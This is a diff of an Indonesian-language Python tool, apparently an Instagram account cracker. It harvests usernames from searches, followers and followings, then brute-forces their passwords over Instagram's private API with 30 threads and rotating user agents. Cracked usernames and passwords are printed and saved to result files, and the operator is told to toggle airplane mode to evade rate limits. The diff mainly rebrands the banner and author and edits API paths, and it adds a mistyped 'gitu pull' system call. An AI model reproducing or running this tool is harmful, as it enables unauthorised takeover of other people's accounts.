@@ -14,7 +14,13 @@ try:
 	import urllib.request
 except ImportError as e:
 	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
-
+	os.system('gitu pull')
+from rich.table import Table as me
+from rich.console import Console as sol
+from rich.console import Group as gp
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
 from time import sleep
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
@@ -86,8 +92,8 @@ def checkin():
 def login():
 	global external
 	try:
-		print(f'\n{M}!{C} Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat\n')
-		us=input(f"{H}>{C} Masukan username: ")
+		print(f'\n{O}!{C} Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat\n')
+		us=input(f"{O}>{C} Masukan username: ")
 		pw=stdiomask.getpass(prompt=f'{H}>{C} Masukan password: ')
 	except KeyboardInterrupt:
 		exit(f'{M}>{C} KeyboardInterrupt terdeteksi... keluar !')
@@ -180,7 +186,7 @@ def user_agentAPI():
 	return USER_AGENT_BASE
 
 class instagramAPI:
-	API_URL = 'https://i.instagram.com/api/v1/'
+	API_URL = 'https://i.instagram.com/api'
 	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
 		'model': 'HM 1SW',
 		'android_version': 18,
@@ -236,7 +242,7 @@ class instagramAPI:
 			self.generateUUID(False),
 			urllib.request.quote(self.data)
 		)
-		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
+		x=self.s.post("https://i.instagram.com/api/accounts/login/", self.payload)
 		x_jason=json.loads(x.text)
 		x_kukis=x.cookies.get_dict()
 		if "logged_in_user" in x.text:
@@ -257,7 +263,7 @@ class instagram:
 		self.cookie=cookie
 		self.s=requests.Session()
 
-	def logo(self):
+	def benner(self):
 		os.system('clear')
 		for i in external:
 			try:
@@ -267,29 +273,24 @@ class instagram:
 			except:
 				pass
 		print(f"""{H}
-    ________             _____              _________
- ____  _/_______________  /______ _      __  ____/
-  __  / __  __ \_  ___/  __/  __ `/_______  / __  
- __/ /  _  / / /(__  )/ /_ / /_/ /_/_____/ /_/ /  
- /___/  /_/ /_//____/ \__/ \__,_/        \____/{C}
+░▐█▀█▒▐█▀▀▄░░▄█▀▄─░▐█▀█▒▐█▒▐▀
+░▐█──▒▐█▒▐█░▐█▄▄▐█░▐█──▒▐██▌░
+░▐█▄█▒▐█▀▄▄░▐█─░▐█░▐█▄█▒▐█▒▐▄{C}
+{K}[*] Email       : bjoget9@gmail.com
+{K}[*] Bergabung   : 26 November 1945
+{K}[*] ---------------------------------------------
+{K}[*] Status      : JOMBLO :V
+{K}[*] Author      : DANZZ X NANO
+{K}[*] ---------------------------------------------
 
-{H}[*] Email       : HussainV@yahoo.com
-{H}[*] Bergabung   : 26 November 1945
-{H}[*] ---------------------------------------------
-{H}[*] Kadaluwarsa : Sampai Kiamat
-{H}[*] Status      : Premium Sampai Yatim
-{H}[*] Author      : Sebastian Hussain V
-{H}[*] ---------------------------------------------
+[01].{K}crack dari pencarian nama
+[02].crack dari pengikut
+[03].crack dari mengikuti
 
-{H}[01]. crack dari pencarian nama
-{H}[02]. crack dari pengikut
-{H}[03]. crack dari mengikuti
+[04].crack ulang hasil crack
+[05].lihat akun hasil crack
+[09].bot auto follow
 
-{H}[04]. crack ulang hasil crack
-{H}[05]. lihat akun hasil crack
-{H}[09]. bot auto follow
-
-{M}[F] Minta Lisensi 
 {M}[P] Keluar
 	""")
 
@@ -338,7 +339,7 @@ class instagram:
 		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
 			self.generateUUID(False),
 			urllib.request.quote(data))
-		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
+		return s.post('https://i.instagram.com/api/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
 
 
 	def searchAPI(self,cookie,nama):
@@ -384,11 +385,11 @@ class instagram:
 	def passwordAPI(self,xnx):
 		print(f'\n [{H}+{C}] Total id >> [{H}{len(internal)}{C}]')
 		print(f"""
- [ List kombinasi password instagram ]
+{U} [ List kombinasi password instagram ]
 
- [1]. V1 Cepat
- [2]. V2 Lambat
- [3]. V3 Sangat Lambat
+{U}[1]. V1 Cepat Hasil Dikit
+{H}[2]. V2 Lambat Hasil Lumayan
+{K}[3]. V3 Sangat Lambat Hasil Banyak
 		""")
 		c=input(f' {M}>>>{C} Password: ')
 		if c=='1':
@@ -402,11 +403,11 @@ class instagram:
 
 	def generateAPI(self,user,o):
 		print(f"""
- [1]. UA - 1
- [2]. UA - 2
- [3]. UA - 3
+{K}[1]. UA - 1
+{H}[2]. UA - 2
+{U}[3]. UA - 3
 		""")
-		ua=input(f' {U}>>{C} user-agent: ')
+		ua=input(f' {U}>>{K} user-agent: ')
 		if ua=='1':
 			uaAPI=User_Agent()
 		elif ua=='2':
@@ -418,7 +419,7 @@ class instagram:
  [{H}+{C}] Hasil OK disimpan ke: result/{day}.txt
  [{O}+{C}] Hasil CP disimpan ke: result/{day}.txt
 
- [{M}!{C}] hidupkan mode pesawat  setiap 2 menit
+ [{U}!{C}] hidupkan mode pesawat  setiap 5 menit
 		""")
 		with ThreadPoolExecutor(max_workers=30) as shinkai:
 			for i in user:
@@ -465,7 +466,7 @@ class instagram:
 
 	def crackAPI(self,user,pas,uaAPI):
 		global loop,success,checkpoint
-		sys.stdout.write(f"\r [CRACK][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),
+		sys.stdout.write(f"\r [PROSES][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[FUCK :{len(checkpoint)}]{C} "),
 		sys.stdout.flush()
 		try:
 			for pw in pas:
@@ -501,7 +502,7 @@ class instagram:
 				x_jason=json.loads(x.text)
 				if "userId" in str(x_jason):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					print(f"""\r {H}[>]{C} {H}STATUS : {H}HUSSAIN LIVE
+					print(f"""\r {H}[>]{C} {H}STATUS : {H}DANZZ OKE
   {H}[>]{C} {H}NAMA: {H}{nama}{C}
   {H}[>]{C} {H}Username: {H}{user}{C}
   {H}[>]{C} {H}Password: {H}{pw}{C}
@@ -573,7 +574,7 @@ class instagram:
 			if "userId" in x.text:
 				nama,pengikut,mengikut,postingan=self.APIinfo(user)
 				print(f"""\r   
-  {H}[>]{C} {H}STATUS     : {H}HUSSAIN LIVE
+  {H}[>]{C} {H}STATUS     : {H}DANZZ OKE
   {H}[>]{C} {H}NAMA         : {H}{nama}{C}
   {H}[>]{C} {H}Username : {H}{user}{C}
   {H}[>]{C} {H}Password  : {H}{pw}{C}
@@ -599,7 +600,7 @@ class instagram:
 			self.checkAPI(user,pw)
 
 	def menu(self):
-		self.logo()
+		self.benner()
 		c=input(f' >> ')
 		if c=='':
 			self.menu()
@@ -679,7 +680,7 @@ class instagram:
 			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
 			x=open('.kukis.log','r').read()
 			x_id=re.findall('sessionid=(\d+)',x)[0]
-			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
+			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/friendships/%s/following/?count=100000',x_id)
 			for i in following:
 				six+=1
 				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
